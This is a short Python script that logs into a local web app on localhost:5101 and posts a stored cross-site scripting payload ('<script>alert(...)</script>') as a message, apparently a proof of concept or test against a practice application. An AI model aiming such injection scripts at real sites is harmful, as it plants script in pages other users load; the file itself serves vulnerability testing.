import requests
from bs4 import BeautifulSoup

payload = "<script>alert('alert')</script>"

port = "5101"
url = f"http://localhost:{port}"

s = requests.Session()

# Login as User
r = s.get(url + "/login")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post(url + "/login", {"csrf_token": token, "username": "user1", "password": "user1"})

# Add message
r = s.get(url + "/add")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post(url + "/add", {"csrf_token": token, "message": payload})

print(r.text)